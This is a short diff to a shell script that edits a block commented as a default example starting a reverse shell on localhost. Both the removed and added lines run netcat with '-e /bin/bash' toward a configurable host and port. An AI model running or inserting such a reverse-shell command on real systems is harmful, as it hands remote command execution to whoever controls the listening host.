@@ -43,8 +43,8 @@ REAL_SERVICE_PORT=$2
 # Default example: starting a reverse shell on localhost
 REVERSE_SHELL_HOST='localhost'
 REVERSE_SHELL_PORT=$REAL_SERVICE_PORT
-echo "Connecting to reverse shell on $REVERSE_SHELL_HOST:$REVERSE_SHELL_PORT"
-netcat -vvv -e /bin/bash $REVERSE_SHELL_HOST $REVERSE_SHELL_PORT
+echo "Connecting to reverse shell listener on $REVERSE_SHELL_HOST:$REVERSE_SHELL_PORT"
+nc -n -vvv $REVERSE_SHELL_HOST $REVERSE_SHELL_PORT -e /bin/bash
 
 echo "Done, Exiting."
 exit 0
